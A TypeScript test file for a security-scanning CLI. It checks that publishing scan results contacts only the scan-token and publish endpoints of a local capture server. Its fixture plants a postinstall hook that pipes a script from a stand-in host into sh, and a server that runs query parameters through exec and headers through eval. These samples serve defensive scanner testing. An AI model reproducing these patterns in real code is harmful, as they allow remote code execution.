/**
 * `secure --publish` on a tree with failing findings sends the scan-token
 * request and the publish, and no request to /api/v1/remediation/track or
 * /api/v1/remediation/remediated.
 *
 * Hermetic: the receiver is the capture registry of
 * __tests__/helpers/outbound-capture.ts, a process of its own listening on
 * 127.0.0.1 (and ::1 where the host has one); the CLI cannot reach any other host.
 */
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { assertDistFresh } from '../helpers/dist-freshness';
import { tempDir } from '../helpers/temp-dir';
import { initThrowawayRepo } from '../helpers/throwaway-repo';
import { runCli, startCaptureRegistry, type CaptureRegistry, type CliRun } from '../helpers/outbound-capture';

beforeAll(assertDistFresh);

let scratch = '';
let registry: CaptureRegistry;
let run: CliRun;

beforeAll(async () => {
  scratch = tempDir('hma-no-remediation-request-');
  registry = await startCaptureRegistry(scratch);
  const target = path.join(scratch, 'target');
  fs.mkdirSync(target, { recursive: true });
  fs.writeFileSync(path.join(target, 'package.json'), JSON.stringify({
    name: 'no-remediation-fixture',
    version: '1.0.0',
    scripts: { postinstall: 'curl -s http://example.invalid/setup.sh | sh' },
  }, null, 2) + '\n');
  fs.writeFileSync(path.join(target, 'server.js'), [
    "const { exec } = require('child_process');",
    "require('http').createServer((req, res) => {",
    "  exec(new URL(req.url, 'http://x').searchParams.get('cmd'), (e, o) => res.end(o));",
    "  eval(req.headers['x-script']);",
    '}).listen(0);',
    '',
  ].join('\n'));
  initThrowawayRepo(target, false);
  run = runCli(['secure', target, '--json', '--publish'], { runDir: path.join(scratch, 'run'), registry });
}, 300_000);

afterAll(() => registry?.stop());

describe('secure --publish', () => {
  it('has failing findings to publish', () => {
    const printed = JSON.parse(run.stdout);
    expect(printed.findings.some((f: { passed: boolean; notApplicable?: boolean }) => !f.passed && !f.notApplicable)).toBe(true);
  });

  it('sends the scan-token request and the publish', () => {
    const routes = run.requests.map((q) => `${q.method} ${q.url.split('?')[0]}`);
    expect(routes).toContain('POST /api/v1/registry/community/request-scan-token');
    expect(routes).toContain('POST /api/v1/trust/publish');
  });

  it('sends no request to either remediation path', () => {
    const remediation = run.requests.filter((q) => /\/remediation\/(track|remediated)/.test(q.url));
    expect(remediation.map((q) => `${q.method} ${q.url}`)).toEqual([]);
  });
});
